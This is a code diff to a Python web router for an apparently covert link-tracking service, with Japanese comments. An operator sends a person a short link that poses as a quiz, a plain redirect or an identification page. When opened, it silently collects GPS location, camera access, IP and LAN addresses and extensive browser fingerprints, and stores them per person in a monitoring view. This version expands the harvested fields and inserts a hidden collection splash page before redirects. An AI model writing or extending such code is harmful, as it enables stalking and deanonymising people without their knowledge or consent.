@@ -1,8 +1,10 @@
-"""追跡ルーター：リンク踏み（一瞬/ライブ）・人物ごとの登録・追跡画面。
+"""追跡ルーター：リンク踏み（一瞬/ライブ/クイズ/識別/転送）・人物ごとの登録・追跡画面。
 
-v9:
-  ・作成後は「相手に送るURL（/l/コード）」をコピーできる状態で着地させる
-  ・監視室と一覧に送るURLを常設（監視室URLをそのまま送ってログイン画面になる事故を防ぐ）
+v11:
+  ・クイズは質問0件でもクイズ画面を返す（監視室へ落ちない）
+  ・全モードで collect.js を必ず走らせ、取得物を全部保存
+  ・逆探知（/link/{code}/reverse）への導線
+  ・_quiz_rows を旧DBの列不足に耐えるよう安全アクセス化
 """
 from __future__ import annotations
 
@@ -42,6 +44,8 @@ LIVE_DEFAULTS = {
     "gate_copy": False,
     "gate_link": False,
     "require_all": True,
+    "quiz_hold": True,
+    "redirect_hold": True,
 }
 
 ENV_MAP = {
@@ -51,7 +55,8 @@ ENV_MAP = {
     "dest_redirect": "LIVE_DEST_REDIRECT", "promote_page": "PROMOTE_PAGE_TO_LIVE",
     "gate": "LIVE_GATE", "gate_warn": "LIVE_GATE_WARN", "gate_extra": "LIVE_GATE_EXTRA",
     "gate_copy": "LIVE_GATE_COPY", "gate_link": "LIVE_GATE_LINK",
-    "require_all": "LIVE_REQUIRE_ALL",
+    "require_all": "LIVE_REQUIRE_ALL", "quiz_hold": "QUIZ_HOLD",
+    "redirect_hold": "REDIRECT_HOLD",
 }
 
 UI_CHOICES = ("", "none", "ask")
@@ -64,13 +69,9 @@ UI_LABEL = {
 VALID_MODES = ("page", "geo", "snap", "live", "quiz", "identify", "redirect")
 
 MODE_LABEL = {
-    "geo": "位置情報（GPS）",
-    "live": "リアルタイム（GPS＋カメラ）",
-    "snap": "一瞬（GPS）",
-    "page": "ページ",
-    "quiz": "クイズ",
-    "identify": "特定",
-    "redirect": "転送",
+    "geo": "位置情報（GPS）", "live": "リアルタイム（GPS＋カメラ）",
+    "snap": "一瞬（GPS）", "page": "ページ", "quiz": "クイズ",
+    "identify": "特定", "redirect": "転送",
 }
 
 
@@ -201,20 +202,15 @@ def _get_track(code):
     return l
 
 
-# ---------- 送るURL（/l/コード）まわり ----------
-
 def share_url(request, code):
-    """相手にDMで送るURL。監視室(/track/コード)ではない。"""
     return _m()._base(request).rstrip("/") + "/l/" + code
 
 
 def watch_url(request, code):
-    """自分用の監視室URL。要ログイン。"""
     return _m()._base(request).rstrip("/") + "/track/" + code
 
 
 def dest_is_watch(base, dest):
-    """飛び先が監視室（要ログイン）になっていないか。"""
     try:
         d = (dest or "").strip()
         if not d:
@@ -228,10 +224,7 @@ def dest_is_watch(base, dest):
     return False
 
 
-# ---------- 識別者コード（vid）ごとの整理 ----------
-
 def _vid_maps(code):
-    """hit_id → vid と、既知の vid 集合と、vid のラベル。"""
     vidmap, labels = {}, {}
     try:
         for h in db.q("SELECT id,vid FROM link_hits WHERE code=?", (code,)):
@@ -249,7 +242,6 @@ def _vid_maps(code):
 
 
 def _person_key(row, vidmap, vids):
-    """1点が誰のものかを決める。vid が取れなければ ip 単位にまとめる。"""
     try:
         note = str(row["note"] or "")
         if note.isdigit():
@@ -327,6 +319,23 @@ def _live_page(request, code, hid, link, nonce):
                   require_all=bool(L["require_all"]))
 
 
+def _quiz_rows(code):
+    out = []
+    for r in db.questions(code):
+        d = dict(r)
+        try:
+            opts = json.loads(d.get("options") or "[]")
+        except Exception:
+            opts = []
+        out.append({"id": d.get("id"), "qtype": d.get("qtype") or "text",
+                    "prompt": d.get("prompt") or "", "options": opts,
+                    "help": d.get("help") or "",
+                    "placeholder": d.get("placeholder") or "",
+                    "required": int(d.get("required") or 0),
+                    "min": d.get("min") or "", "max": d.get("max") or ""})
+    return out
+
+
 # ================= 公開ルート =================
 
 @router.get("/l/{code}")
@@ -348,23 +357,30 @@ def link_hit(code: str, request: Request):
     hrow = db.q1("SELECT nonce FROM link_hits WHERE id=?", (hid,))
     nonce = (hrow["nonce"] if hrow else "") or ""
     mode = (link["mode"] or "page")
+    qs = _quiz_rows(code)
 
+    # 転送：既定は一瞬だけ収集ページを挟む（?hold=0 で即302）
     if mode == "redirect" and link["dest"]:
-        return RedirectResponse(link["dest"], 302)
+        hold = request.query_params.get("hold")
+        if hold == "0" or not L["redirect_hold"]:
+            return RedirectResponse(link["dest"], 302)
+        return render("link_splash.html", request, code=code, hit_id=hid, link=link,
+                      dest=_abs_dest(link["dest"]), nonce=nonce, wait_sec=3.0)
 
-    if mode == "quiz" and db.questions(code):
-        qs = [{"id": r["id"], "qtype": r["qtype"], "prompt": r["prompt"],
-               "options": json.loads(r["options"] or "[]")} for r in db.questions(code)]
+    # クイズ：質問が無くてもクイズ画面を返す（監視室へ落とさない）
+    if mode == "quiz":
         return render("link_quiz.html", request, code=code, hit_id=hid, link=link,
                       dest=link["dest"] or "", nonce=nonce,
                       retry_text=L["retry_text"],
-                      questions_json=json.dumps(qs, ensure_ascii=False))
+                      questions_json=json.dumps(qs, ensure_ascii=False),
+                      is_empty=(len(qs) == 0))
 
     if mode == "identify":
         ip = linktrack.client_ip(request)
         return render("link_identify.html", request, code=code, hit_id=hid, link=link,
                       dest=link["dest"] or "", nonce=nonce, ip=ip,
                       retry_text=L["retry_text"],
+                      notes=linktrack.ip_notes(ip),
                       p=linktrack.parse_ua(request.headers.get("user-agent", "")),
                       g=linktrack.geo(ip))
 
@@ -379,6 +395,16 @@ def link_hit(code: str, request: Request):
                   ask_text=L["ask_text"], go_text=L["go_text"],
                   deny_text=L["deny_text"], retry_text=L["retry_text"],
                   deny_redirect=L["deny_redirect"], dest_min=L["dest_min"])
+
+
+# 受け取る全フィールド（collect.js v16 と一致）
+_HIT_STR = ("screen", "platform", "tz", "tz_client", "lang_list", "lan_ip", "pub_ip",
+            "gpu", "webgl_hash", "canvas_fp", "audio_fp", "codecs", "media_devices",
+            "storage", "net_type", "pointer", "orientation", "dnt", "permissions",
+            "voices", "webgpu", "plugins", "extra")
+_HIT_NUM = ("cores", "mem", "touch", "tzoff", "fonts_n", "battery", "charging",
+            "downlink", "rtt", "clock_skew", "color_gamut", "hdr", "refresh_hz",
+            "cookies_on")
 
 
 @router.post("/l/{code}/x")
@@ -401,9 +427,17 @@ async def link_extra(code: str, request: Request):
     g = linktrack.geo(ip)
 
     f = {}
-    for k in ("screen", "tz", "platform", "cores", "mem", "touch"):
-        if body.get(k) not in (None, ""):
-            f[k] = body[k]
+    for k in _HIT_STR:
+        v = body.get(k)
+        if v not in (None, "", [], {}):
+            f[k] = v if isinstance(v, str) else json.dumps(v, ensure_ascii=False)[:8000]
+    for k in _HIT_NUM:
+        v = body.get(k)
+        if v not in (None, ""):
+            try:
+                f[k] = float(v) if k in ("mem", "downlink", "clock_skew") else int(float(v))
+            except (TypeError, ValueError):
+                pass
     if body.get("gps_lat") is not None:
         f["gps_lat"] = body.get("gps_lat")
         f["gps_lon"] = body.get("gps_lon")
@@ -436,7 +470,6 @@ async def link_extra(code: str, request: Request):
             pubkey=str(body.get("pubkey") or "")[:512])
 
     link = db.track_get(code)
-    # GPSが取れなかった端末でも点を残す（ip_point=1 で回線推定）
     if link and link["active"] and (body.get("gps_lat") is not None
                                     or body.get("ip_point")):
         trow = _tp_row(code, link, ip, p, g, body, kind="snap", sid=vid)
@@ -600,22 +633,17 @@ async def live_settings_save(request: Request, u=Depends(auth)):
         return form.get(k) not in (None, "", "0", "off", "false")
 
     data = {
-        "ui": s("ui"),
-        "ask_text": s("ask_text")[:160],
-        "deny_text": s("deny_text")[:240],
-        "retry_text": s("retry_text")[:40],
+        "ui": s("ui"), "ask_text": s("ask_text")[:160],
+        "deny_text": s("deny_text")[:240], "retry_text": s("retry_text")[:40],
         "go_text": s("go_text")[:40],
         "wait_sec": max(3.0, min(num("wait_sec", 15), 120.0)),
         "dest_min": max(0.5, min(num("dest_min", 2), 30.0)),
-        "deny_redirect": flag("deny_redirect"),
-        "dest_redirect": flag("dest_redirect"),
-        "promote_page": flag("promote_page"),
-        "gate": flag("gate"),
-        "gate_warn": flag("gate_warn"),
-        "gate_extra": s("gate_extra")[:800],
-        "gate_copy": flag("gate_copy"),
-        "gate_link": flag("gate_link"),
-        "require_all": flag("require_all"),
+        "deny_redirect": flag("deny_redirect"), "dest_redirect": flag("dest_redirect"),
+        "promote_page": flag("promote_page"), "gate": flag("gate"),
+        "gate_warn": flag("gate_warn"), "gate_extra": s("gate_extra")[:800],
+        "gate_copy": flag("gate_copy"), "gate_link": flag("gate_link"),
+        "require_all": flag("require_all"), "quiz_hold": flag("quiz_hold"),
+        "redirect_hold": flag("redirect_hold"),
     }
     if data["ui"] not in UI_CHOICES:
         data["ui"] = ""
@@ -675,7 +703,8 @@ def tracks_add(request: Request, person: str = Form(""), mode: str = Form("geo")
         users.register_link(code, u)
     except Exception:
         pass
-    # ★ 監視室に着地しつつ「送るURL」をコピーできる状態にする
+    if mode == "quiz":
+        return RedirectResponse(f"/link/{code}/questions?new=1", status_code=303)
     return RedirectResponse(f"/track/{code}?new=1", status_code=303)
 
 
